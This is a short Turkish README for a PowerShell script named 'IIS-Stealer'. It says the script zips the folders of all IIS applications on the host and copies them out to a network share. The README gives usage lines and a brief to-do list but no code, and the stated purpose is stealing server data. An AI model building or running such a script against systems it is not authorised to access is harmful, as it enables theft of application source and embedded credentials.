# IIS-Stealer

Çalıştığı sistemde bulunan IIS içindeki tüm uygulamaların klasörlerini zipleyip dışarıya atan kod parçacığı.

## Kullanımı

```
./srealer.ps1 ZIPLENEN-DOSYALARIN-KOPYALANACAGI-DIZIN ZIP-DOSYA_ADININ-ONADI

./stealer.ps1 \\LOCAL\paylasim prefix[optional]```

## Yapılacaklar Listesi

* Hedef sistemin diski "zip" oluşturmaya yetecek kadar boş alana sahipliğinin kontrolü
* Diğer IIS uygulamaları aynı dizini paylaşıyorsa, EN üst dizin zaten altındaki uygulamaları kapsadığından çalışma süresi uzuyor.
